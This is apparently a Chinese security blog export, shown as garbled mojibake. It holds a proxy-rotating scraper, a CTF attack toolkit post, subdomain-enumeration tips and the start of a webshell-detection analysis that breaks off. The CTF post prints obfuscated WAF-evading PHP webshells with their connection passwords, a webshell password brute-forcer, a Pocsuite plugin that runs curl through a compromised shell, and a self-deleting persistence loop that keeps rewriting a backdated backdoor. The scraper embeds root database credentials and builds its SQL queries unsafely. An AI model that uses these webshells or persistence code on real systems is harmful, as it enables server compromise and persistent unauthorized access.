è®¾ç½®äº¤äº’æ–¹å¼æ•°æ®äº¤äº’ä½¿ç”¨pythonçš„PyMySQLæ¨¡å—ï¼Œæ”¯æŒpy2,py3ã€‚1234567891011conn = pymysql.connect( host=&apos;127.0.0.1&apos;, port=3306, user=&apos;root&apos;, passwd=&apos;123456&apos;, db=&apos;proxy&apos;, charset=&apos;utf8mb4&apos;, )cur = conn.cursor()sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;test1&apos;,&apos;100&apos;)&quot;cur.execute(sql) 0x03 ä»£ç†è·å–ä»£ç†ä½¿ç”¨å…è´¹çš„è¥¿åˆºä»£ç†(æ²¡é’±-.-)ï¼Œä½¿ç”¨requestsã€BeautifulSoupåšæ•°æ®å¤„ç†ã€‚1234567891011r = requests.get(url=url_xichi,headers=headers)soup = bs(r.content,&apos;lxml&apos;)datas = soup.find_all(name=&apos;tr&apos;,attrs=&#123;&apos;class&apos;:re.compile(&apos;(odd)|()&apos;)&#125;)for data in datas: proxys = data.find_all(name=&apos;td&apos;) ip = str(proxys[1].string) port = str(proxys[2].string) type = str(proxys[5].string).lower() avail_proxy = proxy_check(ip,port,type) if avail_proxy != None: return avail_proxy 0x04 ä»£ç†éªŒè¯éªŒè¯ä»£ç†çš„å­˜æ´»æ€§ï¼Œä½¿ç”¨ç«™é•¿å·¥å…·çš„ipå®šä½å®ç°1234567try: r = requests.get(url=url_check,proxies=proxylist,timeout=5) find_ip = re.findall(r&apos;\&apos;(.*?)\&apos;&apos;,r.text)[0] if ip == find_ip: return proxylistexcept Exception,e: pass 0x05 æ•°æ®å…¥åº“è¿™é‡Œå°±ä»¥è°·å®‰ç½‘æ ¡çš„è¯¾ç¨‹æ¥çˆ¬ï¼Œä¸»è¦çˆ¬è¯¾ç¨‹åå­—åŠå¯¹åº”çš„ä»·æ ¼ã€‚æ•ˆæœå¦‚ä¸‹å›¾ï¼šé™„ï¼šæºä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Authorï¼šW2n1ck@Indexï¼šhttp://www.w2n1ck.com/&apos;&apos;&apos;import randomimport reimport requestsimport pymysqlimport sysimport timereload(sys)sys.setdefaultencoding(&apos;utf-8&apos;)from bs4 import BeautifulSoup as bsconfig=&#123; &apos;NUM&apos;:10, &apos;timeout&apos;:5, &apos;USER_AGENTS&apos;:[ &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;, &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;, &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;, &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;, &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,]&#125;headers = &#123;&apos;User-Agent&apos;: random.choice(config[&apos;USER_AGENTS&apos;])&#125;proxy = []conn = pymysql.connect( host=&apos;127.0.0.1&apos;, port=3306, user=&apos;root&apos;, passwd=&apos;123456&apos;, db=&apos;proxy&apos;, charset=&apos;utf8mb4&apos;, )cur = conn.cursor()#sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;test2&apos;,&apos;200&apos;)&quot;#cur.execute(sql)def proxy_spider(): url_xichi = &apos;http://www.xicidaili.com/nn/&apos; r = requests.get(url=url_xichi,headers=headers) soup = bs(r.content,&apos;lxml&apos;) datas = soup.find_all(name=&apos;tr&apos;,attrs=&#123;&apos;class&apos;:re.compile(&apos;(odd)|()&apos;)&#125;) #print datas for data in datas: proxys = data.find_all(name=&apos;td&apos;) ip = str(proxys[1].string) #ip = &apos;http://&apos;+ip port = str(proxys[2].string) type = str(proxys[5].string).lower() avail_proxy = proxy_check(ip,port,type) if avail_proxy != None: return avail_proxydef proxy_check(ip,port,type): url_check = &apos;http://ip.chinaz.com/getip.aspx&apos; proxylist = &#123;&#125; proxylist[type] = &apos;%s:%s&apos; % (ip,port) #print proxylist try: r = requests.get(url=url_check,proxies=proxylist,timeout=5) find_ip = re.findall(r&apos;\&apos;(.*?)\&apos;&apos;,r.text)[0] #print find_ip if ip == find_ip: return proxylist #proxy.append(find_ip) #print proxy except Exception,e: passdef decode_str(str): return str.replace(&apos; &apos;,&apos;&apos;).replace(&apos;\t&apos;,&apos;&apos;).replace(&apos;\n&apos;,&apos;&apos;).encode(&apos;utf-8&apos;)def get_title_price(url): proxy_url = proxy_spider() r = requests.get(url=url,proxies=proxy_url,timeout=20) content = r.content soup = bs(content,&apos;lxml&apos;) content_titles = soup.find_all(name=&apos;a&apos;,attrs=&#123;&apos;class&apos;:&apos;link-dark&apos;&#125;) content_prices = soup.find_all(name=&apos;span&apos;,attrs=&#123;&apos;class&apos;:&apos;price&apos;&#125;) for title,price in zip(content_titles,content_prices): tmp_title = decode_str(str(title.string)) tmp_price = decode_str(str(price.string)) print tmp_title,tmp_price sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;%s&apos;,&apos;%s&apos;)&quot;%(tmp_title,tmp_price) cur.execute(sql)if __name__==&apos;__main__&apos;: #proxy_spider() url_spider = &apos;http://edu.aqniu.com/course/explore?page=&apos; for i in range(12): spider_url = url_spider+str(i) get_title_price(spider_url) time.sleep(random.random()*1) cur.close()]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>çˆ¬è™«</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>ä»£ç†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTFçº¿ä¸‹èµ›ç›¸å…³å·¥å…·]]></title>
    <url>%2F2017%2F05%2F16%2FCTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[ä¸Šä¸Šå‘¨æ‰“äº†å¤§å­¦ç”Ÿæ¶¯çš„æœ€åä¸€åœºCTFæ¯”èµ›ï¼Œæ„Ÿè§‰ç»™è€å¸ˆä¸¢äººäº†ï¼Œè‡ªå·±èµ›å‰å‡†å¤‡çš„ä¸œè¥¿ä¹Ÿæ²¡å’‹ç”¨ä¸Šï¼Œå¾ˆæ†‹å±ˆå•Šï¼ä¸è¯´äº†ï¼Œè¿˜æ˜¯å¤ªèœï¼è¿™ä¸¤å‘¨å¿™ç€æ¯•ä¸šè®¾è®¡çš„äº‹ï¼Œä¸€ç›´æ²¡æ—¶é—´å†™ã€‚æŠŠè‡ªå·±æ”¶é›†çš„èµ„æ–™åˆ†äº«ä¸‹å§ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œè¯·å¤§ç‰›ä»¬æŒ‡å¯¼ä¸‹ã€‚ ä¸€ã€linux tcpdumpä½¿ç”¨tcpdumpçš„é‡è¦æ€§ä¸ç”¨æˆ‘è¯´äº†å§ï¼Œéƒ½æ‡‚ï¼Œä½†æ˜¯åœ¨CTFä¸­å¯èƒ½ä¼šæ²¡æœ‰æƒé™ä½¿ç”¨ã€‚ä½†æ˜¯å·¥ä½œä¸­è‚¯å®šä¼šç”¨åˆ°çš„ï¼Œç›¸ä¿¡æˆ‘ï¼Œä¸è¦ä¸ºCTFè€ŒCTFâ€¦ï¼ˆä¸å¥½æ„æ€æ‰¯æ·¡äº† =.=ï¼‰ 1.1ã€è¿‡æ»¤ä¸»æœºæŠ“å–æ‰€æœ‰ç»è¿‡eth1ï¼Œç›®çš„æˆ–æºåœ°å€æ˜¯192.168.1.1çš„ç½‘ç»œæ•°æ® tcpdump -i eth1 host 192.168.1.1æŒ‡å®šæºåœ°å€ tcpdump -i eth1 src host 192.168.1.1æŒ‡å®šç›®çš„åœ°å€ tcpdump -i eth1 dst host 192.168.1.1 1.2ã€è¿‡æ»¤ç«¯å£æŠ“å–æ‰€æœ‰ç»è¿‡eth1ï¼Œç›®çš„æˆ–æºç«¯å£æ˜¯25çš„ç½‘ç»œæ•°æ® tcpdump -i eth1 port 25æŒ‡å®šæºç«¯å£ tcpdump -i eth1 src port 25æŒ‡å®šç›®çš„ç«¯å£ tcpdump -i eth1 dst port 25 1.3ã€ç½‘ç»œè¿‡æ»¤tcpdump -i eth1 net 192.168 tcpdump -i eth1 src net 192.168 tcpdump -i eth1 dst net 192.168 1.4ã€åè®®è¿‡æ»¤tcpdump -i eth1 arp tcpdump -i eth1 ip tcpdump -i eth1 tcp tcpdump -i eth1 udp tcpdump -i eth1 icmp 1.5ã€å¸¸ç”¨è¡¨è¾¾å¼é : ! or &quot;not&quot; (å»æ‰åŒå¼•å·) ä¸” : &amp;&amp; or &quot;and&quot; æˆ– : || or &quot;or&quot; æŠ“å–æ‰€æœ‰ç»è¿‡eth1ï¼Œç›®çš„åœ°å€æ˜¯192.168.1.254æˆ–192.168.1.200ç«¯å£æ˜¯80çš„TCPæ•°æ® tcpdump -i eth1 â€˜((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))â€™æŠ“å–æ‰€æœ‰ç»è¿‡eth1ï¼Œç›®æ ‡MACåœ°å€æ˜¯00:01:02:03:04:05çš„ICMPæ•°æ® tcpdump -i eth1 â€˜((icmp) and ((ether dst host 00:01:02:03:04:05)))â€™æŠ“å–æ‰€æœ‰ç»è¿‡eth1ï¼Œç›®çš„ç½‘ç»œæ˜¯192.168ï¼Œä½†ç›®çš„ä¸»æœºä¸æ˜¯192.168.1.200çš„TCPæ•°æ® tcpdump -i eth1 â€˜((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200)))â€™ äºŒã€ä¸€å¥è¯æœ¨é©¬ä¸€å¥è¯æœ¨é©¬ä¸»è¦è¾¾åˆ°çš„ç›®çš„å°±æ˜¯å°±ç®—åˆ«äººçœ‹åˆ°äº†è¿™ä¸ªwebshellï¼Œä»–ä»¬ä¹Ÿä¸ä¼šç”¨ã€‚ä¸ç„¶åˆ«äººç›´æ¥åˆ©ç”¨ä½ ï¼Œç”¨çš„webshellæ”¶å‰²flagã€‚æˆ‘ä»è‡ªå·±æœé›†çš„è¿‡wafçš„webshellä¸­æŒ‘äº†ä¸¤ä¸ªã€‚12&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; åŸç†æˆ‘å°±ä¸è®²äº†ï¼Œçœ‹ä¸€ä¸‹ä½ å°±æ˜ç™½äº†ï¼Œå¾ˆç®€å•ã€‚QGV2YWwoJF9QT1NUWzBdKTs=éšæ„å˜ã€‚èœåˆ€é…ç½®å¡«&lt;O&gt;n985de9=QGV2YWwoJF9QT1NUWzBdKTs=&lt;/O&gt;è¿æ¥å¯†ç :0ï¼ˆé›¶ï¼‰1&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt; èœåˆ€è¿æ¥å¯†ç :1ï¼Œè‡ªå·±å¯ä»¥æ”¹æ”¹ï¼Œä¸»è¦å­¦æ€è·¯ã€‚ ä¸‰ã€webshellçˆ†ç ´ç®€å•ç²—æš´ï¼Œåªè¦å‘ç°ï¼Œå•¥éƒ½ä¸ç”¨æƒ³ï¼Œæ‹¿èµ·å·¥å…·å°±æ˜¯å¹²ï¼webshellçˆ†ç ´é‡‡ç”¨ä¹‹å‰toolsåˆ†äº«çš„æ€è·¯ï¼ŒApacheä¸€æ¬¡å…è®¸åŒæ—¶æäº¤1000ä¸ªå‚æ•°ï¼Œ IISå…è®¸ä¸€æ¬¡æäº¤5883ä¸ªå‚æ•°ã€‚è¿™é‡Œæˆ‘ä¸»è¦ç”¨äº†ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯K8å†™çš„GUIç‰ˆæœ¬çš„ï¼Œæ”¯æŒPHPã€JSPã€ASPã€ASPXç­‰ä¸€ä¸ªæ˜¯è‡ªå·±å†™çš„PHPçš„ã€‚ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š123456789101112131415161718192021221000å¤„ç†for i in range(0,dics): new_group = [] for m in range(i*1000,(i+1)*1000): new_group.append(group[m]) m += 1 for n in new_group: post_data[n] = &apos;echo &quot;password is :%s&quot;;&apos; % n req = requests.post(url,data=post_data) print u&quot;æ­£åœ¨è¿›è¡Œç¬¬ %s ç»„å­—å…¸çˆ†ç ´&quot; % str(i + 1) print req.content+&apos;****************************-SUCCESS!&apos; post_data.clear()ä½™æ•°å¤„ç†new_group1 = []for kk in range(dics*1000, len(content)): new_group1.append(group[kk]) kk += 1for each in new_group1: post_data[each] = &apos;echo &quot;password is %s&quot;;&apos; % eachr = requests.post(url,data=post_data)print u&quot;æ­£åœ¨è¿›è¡Œä½™æ•°å­—å…¸çˆ†ç ´&quot;print r.content+&apos;****************************-SUCCESS!&apos; å››ã€æ‰¹é‡å‘åŒ…ç¨‹åºç›®çš„å¾ˆç®€å•ï¼Œå°±æ˜¯å¯¹æ‰€åœ¨ç½‘æ®µçš„å…¶ä»–ä¸»æœºæ‰¹é‡è¿›è¡ŒæŸä¸€ä¸ªæ“ä½œï¼Œå…·ä½“æ€ä¹ˆåšï¼Œæ‹¿å®ƒå¹²å˜›ï¼Œçœ‹è‡ªå·±æ€ç»´äº†ã€‚ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š12345678910111213def sender(domain): #proxies = &#123; &quot;http&quot;: &quot;http://127.0.0.1:8888&quot;&#125; url = domain post_data =&quot;password=ls&quot; payload = &quot;header test&quot; headers = &#123;&apos;content-type&apos;: payload,&apos;User-Agent&apos;:random.choice(config[&apos;USER_AGENTS&apos;])&#125; request = urllib2.Request(url,post_data,headers) response = urllib2.urlopen(request,timeout=config[&apos;timeout&apos;]) if response.getcode() == 200: res = response.read() return res else: return 0 åŠ å…¥äº†å¤šçº¿ç¨‹ï¼ŒéšæœºUAç­‰(å…¶å®Pythonçš„å¤šçº¿ç¨‹å¾ˆé¸¡è‚‹çš„ï¼Œä½ è¦æµ‹è¯•è¿‡å¯¹æ¯”ä¸‹æ—¶é—´ä½ å°±çŸ¥é“äº†ã€‚åŸå› ä½ å¯ä»¥æŸ¥ä¸‹è¿›ç¨‹ã€çº¿ç¨‹å…³äºå¤šæ ¸CPUçš„åˆ©ç”¨ç›¸å…³çš„ä¸€äº›èµ„æ–™)ã€‚ äº”ã€Pocsuiteç¥å™¨ï¼Œå°±ä¸è§£é‡Šäº†ã€‚å…¶å®åŸç†å¾ˆç®€å•ï¼Œåšäº†ä¸ªæ‰¹é‡åŒ–çš„æ¡†æ¶ï¼Œè‡ªå·±å†™æ’ä»¶ã€‚ä¸»è¦éªŒè¯ä»£ç å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728293031323334353637def _verify(self): import re result = &#123;&#125; webshellpath = &quot;/ctf/webshell.php&quot; # é…ç½®webshellæ‰€åœ¨ç›®å½• payload = &quot;&#123;domain&#125;&quot; + webshellpath for pwd in self.pwdList: exp_url = payload.format(domain=self.url) + &apos;?&apos; + pwd + &apos;=echo &quot;dropsec&quot;;&apos; print exp_url # exp_url = (payload.format(domain=self.url)) data = &#123; pwd : u&apos;&apos;&apos;echo &quot;dropsec&quot;;&apos;&apos;&apos; &#125; try: response = req.post(exp_url, data=data, timeout=10, verify=False) except Exception, e: return self.parse_output(result) if response.status_code != 404: result[&apos;VerifyInfo&apos;] = &#123;&#125; result[&apos;VerifyInfo&apos;][&apos;status_code&apos;] = response.status_code result[&apos;VerifyInfo&apos;][&apos;is&apos;] = &apos;password wrong&apos; if &apos;dropsec&apos; in response.content: result[&apos;VerifyInfo&apos;][&apos;url&apos;] = exp_url result[&apos;VerifyInfo&apos;][&apos;is&apos;] = &apos;password yes&apos; data = &#123; pwd : u&apos;&apos;&apos;system(&apos;curl http://192.168.2.3:8080/ctf/webshell.php&apos;);&apos;&apos;&apos; #pwd : u&apos;&apos;&apos;system(&apos;curl http://10.0.1.2&apos;);&apos;&apos;&apos; &#125; try: response = req.post(exp_url, data=data, timeout=10, verify=False) result[&apos;VerifyInfo&apos;][&apos;flag&apos;] = response.content return self.parse_output(result) except Exception, e: return self.parse_output(result) return self.parse_output(result) å…­ã€æ‰¹é‡ä¸Šä¼ æ–‡ä»¶åšè¿™ä¸ªçš„ç›®çš„å…¶å®å°±æ˜¯å› ä¸ºç¬¬ä¸€æ¬¡ç©CTFçº¿ä¸‹èµ›æ‰‹é€Ÿæ…¢ï¼Œä¸ºäº†ä»¥åä¸åœ¨å› ä¸ºè¿™ä¸ªé—®é¢˜åœ¨è·Œå€’è€Œåšçš„ã€‚PS:å…¶å®è¿™ä¸ªå°åŠŸèƒ½æœ‰æ—¶å€™è¿˜æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚æˆ‘å¤šè¯»ä¹¦å¤šï¼Œä¸éª—ä½ -.-{æ–œçœ¼} ä¸ƒã€æƒé™ç»´æŒCTFçš„æƒé™ç»´æŒå¾ˆç®€å•å•Šï¼Œå°±æ˜¯æœ¨é©¬åˆ«è¢«åˆ ä¸å°±å¥½äº†ã€‚å¹¶ä¸éœ€è¦ææƒå•Šä»€ä¹ˆçš„å•Š{æ‚è„¸}ï¼Œæœ‰æ—¶å€™ä½ è€ƒè™‘é—®é¢˜è¦ç»“åˆå®é™…å•Šï¼Œå’‹ç®€å•å°±å’‹æ¥å˜›ã€‚å°±æ˜¯åšä¸ªä¸æ­»é©¬å°±å¥½äº†ã€‚PS:è¿™ç§å°ä¼ä¿©åªæ˜¯å¯¹ä»˜ä¸€èˆ¬çš„CTFæ¯”èµ›ï¼Œå¯¹é‚£ç§èµ›æ£è‚¯å®šä¸é€‚ç”¨äº†ï¼Œäººå®¶å†™ä¸ªæ¡ä»¶ç«äº‰çš„ï¼Œåˆ†åˆ†é’Ÿæ‰“å“­ä½ å•Š{æ‚è„¸}ï¼Œæ‰€ä»¥è¿˜å¾—çœ‹æƒ…å†µï¼Œè¯¥åå¼¹è¿˜æ˜¯è¦åå¼¹å•Šã€‚123456789101112&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); //file_put_contents(__FILE__,&apos;&apos;); while(1)&#123; file_put_contents(&apos;C:\phpStudy\WWW\ctf\.config.php&apos;,&apos;&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[\&apos;n985de9\&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;&apos;); system(&apos;chmod 777 .config.php&apos;); touch(&quot;.config.php&quot;,mktime(20,15,1,11,28,2016)); usleep(100); &#125;?&gt; ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œæ‰¹é‡è®¿é—®ï¼Œå°±ä¼šä¸€ç›´ç”Ÿæˆæœ¨é©¬æ–‡ä»¶ã€‚PSï¼šå¤§å®¶è¯•æƒ³ä¸‹ï¼Œè¦æ˜¯æ¯”èµ›ä¸­å­˜åœ¨ä¸€ä¸ªä¸€å¥è¯åé—¨ï¼Œåˆ©ç”¨æ‰¹é‡ä¸Šä¼ ç¨‹åºï¼Œå°†è¿™ä¸ªåé—¨æ‰¹é‡ä¸Šä¸Šä¼ åˆ°å„ä¸ªé¶æœºä¸Šï¼Œå†åˆ©ç”¨æ‰¹é‡å‘åŒ…ç¨‹åºè®¿é—®è¿™ä¸ªåé—¨ï¼Œå†åˆ©ç”¨pocsuite,ç„¶åã€‚ã€‚ã€‚å“ˆå“ˆå“ˆï¼Œæ˜¯ä¸æ˜¯å¾ˆçˆ½ã€‚(ç†æƒ³å¾ˆä¸°æ»¡å•Šâ€¦) å…«ã€æ—¥å¿—è®°å½•ä¸»è¦æ˜¯ä¸ºäº†ç½‘ç«™è®¿é—®è®°å½•ï¼Œä¾¿äºåç»­çš„é—®é¢˜æ’æŸ¥ï¼Œå°±æ˜¯æŠŠå„ç§å­—æ®µçš„æ•°æ®è®°å½•ä¸‹æ¥ã€‚12345678910111213141516date_default_timezone_set(&apos;Asia/Shanghai&apos;);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //è®¿é—®IP$filename = $_SERVER[&apos;PHP_SELF&apos;]; //è®¿é—®çš„æ–‡ä»¶$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //æŸ¥è¯¢çš„å­—ç¬¦ä¸²$method = $_SERVER[&apos;REQUEST_METHOD&apos;]; //è¯·æ±‚æ–¹æ³•...$time = date(&apos;Y-m-d H:i:s&apos;,time()); //è¯·æ±‚æ—¶é—´$post = file_get_contents(&quot;php://input&quot;,&apos;r&apos;); //æ¥æ”¶POSTæ•°æ®$others = &apos;**********************************************************************&apos;;$logadd = &apos;è®¿é—®æ—¶é—´ï¼š&apos;.$time.&apos;è®¿é—®IP:&apos;.$ip.&apos;è¯·æ±‚æ–¹æ³•ï¼š&apos;.$method.&apos; &apos;.&apos;è®¿é—®é“¾æ¥ï¼š&apos;.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;...//è®°å½•å†™å…¥$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fwrite($fh,print_r($_COOKIE, true).&quot;\r\n&quot;);fwrite($fh,$others.&quot;\r\n&quot;);fclose($fh); ä¹ã€æ–‡ä»¶ç›‘æ§ç½‘ä¸Šè‡ªå·±æœæœå§ï¼Œå¾ˆå¤š åã€WAFç½‘ä¸Šè‡ªå·±æœæœå§ï¼Œå¾ˆå¤š PSï¼šä¹å’Œåï¼Œæ³¨æ„åˆ†å¯¸ï¼Œä¸èƒ½å½±å“æ­£å¸¸ä¸šåŠ¡çš„ã€‚ ã€‚ã€‚ã€‚ å¥½ä¹…æ²¡å†™è¿™ä¹ˆé•¿çš„åšå®¢äº†ã€‚ã€‚ã€‚]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>PHP</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>tcpdump</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¼æ´æŒ–æ˜ä¹‹å­åŸŸåé‡‡é›†]]></title>
    <url>%2F2017%2F04%2F29%2F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E5%AD%90%E5%9F%9F%E5%90%8D%E9%87%87%E9%9B%86%2F</url>
    <content type="text"><![CDATA[å‡†å¤‡å‡†å¤‡ä¸œè¥¿ï¼Œä»¥åå°±å¼€å§‹æ­£å¼æŒ–æ´äº†(ä¹‹å‰éƒ½æ˜¯é‡ç”Ÿçš„å•Š[æ‚è„¸])ï¼Œæ•´ç†ä¸‹ç›¸å…³çš„çŸ¥è¯†ï¼Œæ–¹ä¾¿è‡ªå·±æŸ¥çœ‹å§ã€‚(æ±‚å¤§ä½¬ä»¬çš„å§¿åŠ¿ *&gt;*) 1ã€Webå­åŸŸåçŒœæµ‹ä¸è®¿é—®å°è¯•çŒœæµ‹ä¸€äº›å¯èƒ½çš„å­åŸŸåï¼Œç„¶åæµè§ˆå™¨è®¿é—®ä¸‹çœ‹æ˜¯å¦å­˜åœ¨ã€‚ 2ã€æœç´¢å¼•æ“æŸ¥è¯¢æ¯”å¦‚: site:163.com 3ã€æŸ¥è¯¢DNSçš„ä¸€äº›è§£æè®°å½•æ¯”å¦‚æŸ¥è¯¢ MXã€CNAME è®°å½•ç­‰ æ¯”å¦‚ç”¨ nslookupå‘½ä»¤ nslookup -qt=any bing.com 4ã€çˆ¬è™«çˆ¬å–é¡µé¢æå–å­åŸŸåå¯ä»¥åˆ©ç”¨çˆ¬è™«ä»é¡µé¢æºä»£ç ä¸­æå–å­åŸŸå æ¯”å¦‚burp çš„spiderçˆ¬è™« 5ã€crossdomain.xml æ–‡ä»¶6ã€é€šè¿‡ IP åæŸ¥whoisï¼Œç«™é•¿å·¥å…·ç­‰ 7ã€é€šè¿‡ HTTPS è¯ä¹¦æœé›†httpsçš„ç«™ç‚¹éƒ½æœ‰è¯ä¹¦ æ‰“å¼€è¯ä¹¦ï¼ŒæŸ¥çœ‹è¯¦ç»†ä¿¡æ¯-&gt;ä½¿ç”¨è€…å¯é€‰åç§°-&gt;DNS Name 8ã€ä¸€äº›æ¼æ´çš„åˆ©ç”¨å¦‚ï¼š DNS åŸŸä¼ é€æ¼æ´ nslookup set type=ns xxx.com server servers address set type=any ls -d xxx.com åœ¨çº¿å·¥å…·ï¼š http://i.links.cn/subdomain/ å¯æŸ¥è¯¢äºŒçº§ã€ä¸‰çº§ç­‰å­åŸŸå http://dns.aizhan.com/ æŸ¥è¯¢åŒ IP ç»‘å®šäº†å“ªäº›åŸŸå https://crt.sh/ æ ¹æ® HTTPS è¯ä¹¦æŸ¥è¯¢å­åŸŸå https://crt.sh/?q=%25.baidu.com https://censys.io/certificates?q=.example.com Censys.ioæŸ¥è¯¢ æœ¬åœ°å·¥å…· Layer å­åŸŸåæŒ–æ˜æœº wydomain çŒªçŒªä¾ ï¼šhttps://github.com/ring04h/wydomain subDomainsBrute Sublist3r é›†åˆgoogleï¼Œbingï¼Œcrt.shç­‰å¼ºå¤§çš„æ ¹æ® python sublist3r.py -d example.com theHarvester python theHarvester.py -d example.com -b all è¿™ä¸ªå·¥å…·æœ‰ä¸ªæ¯”è¾ƒå¥½çš„å®ƒèƒ½å¤Ÿæœé›†ç›®æ ‡çš„é‚®ç®±ã€‚]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
        <tag>æ¼æ´æŒ–æ˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebshellæŸ¥æ€çš„æ–°æ€è·¯]]></title>
    <url>%2F2017%2F04%2F27%2FWebshell%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[ç”±äºå­¦æ ¡è¦ä¸¾åŠä¸ªCTFæ¯”èµ›ï¼Œæ‰€ä»¥æ²¡åŠæ³•å¿…é¡»å‚åŠ ã€‚ã€‚ã€‚ç„¶åå°±æ˜¯å‡†å¤‡å„ç§è„šæœ¬äº†ï¼Œå…³äºwebshellçš„æŸ¥æ€æœ‰äº†ä¸€ä¸ªæ–°çš„æƒ³æ³•ã€‚æœ€ç®€å•çš„ä¸€å¥è¯å½¢å¦‚ï¼š&lt;?php @eval($_POST[&#39;pass&#39;])?&gt;ï¼ŒåŸç†å¾ˆç®€å•é¦–å…ˆ$_POSTä¼šè·å–POSTåˆ°æœåŠ¡å™¨çš„å‚æ•°åä¸ºpassçš„POSTè¯·æ±‚æ•°æ®ï¼Œç„¶åå‡½æ•°evalä¼šå°†$_POSTè·å–çš„å­—ç¬¦ä¸²æŒ‰ç…§PHPè¯­æ³•è¿›è¡Œè§£æï¼Œè¿™æ ·æˆ‘ä»¬é€šè¿‡å„ç§PHPå‡½æ•°çš„ç»„åˆä½¿ç”¨å°±èƒ½é€šè¿‡ä¸­å›½èœåˆ€ç­‰å·¥å…·å¯¹æœåŠ¡å™¨çš„æ–‡ä»¶ç­‰è¿›è¡Œæ“ä½œï¼Œè¿™ä¹Ÿå°±æ˜¯å¸¸è§ä¸€å¥è¯çš„å·¥ä½œåŸç†ã€‚ è¿™é‡Œæˆ‘ç”¨ä¸¤ä¸ªiæ˜¥ç§‹ä¸Šçš„è¿‡ç‹—é©¬æ¥åˆ†æä¸‹ï¼šç¬¬ä¸€ä¸ªï¼š123456789101112131415161718&lt;?php$mt=&quot;mFsKCleRfU&quot;;$ojj=&quot;IEBleldle&quot;;$hsa=&quot;E9TVFsnd2VuJ10p&quot;;$fnx=&quot;Ow==&quot;;$zk = str_replace(&quot;d&quot;,&quot;&quot;,&quot;sdtdrd_redpdldadcde&quot;);//å­—ç¬¦ä¸²æ›¿æ¢ï¼šæ›¿æ¢sdtdrd_redpdldadcdeé‡Œçš„dä¸ºç©º å¾—åˆ°å‡½æ•°str_replace$ef = $zk(&quot;z&quot;, &quot;&quot;, &quot;zbazsze64_zdzeczodze&quot;);//è°ƒç”¨$zk å­—ç¬¦ä¸²æ›¿æ¢ï¼šæ›¿æ¢zbazsze64_zdzeczodzeé‡Œçš„zä¸ºç©º å¾—åˆ°base64_decode$dva = 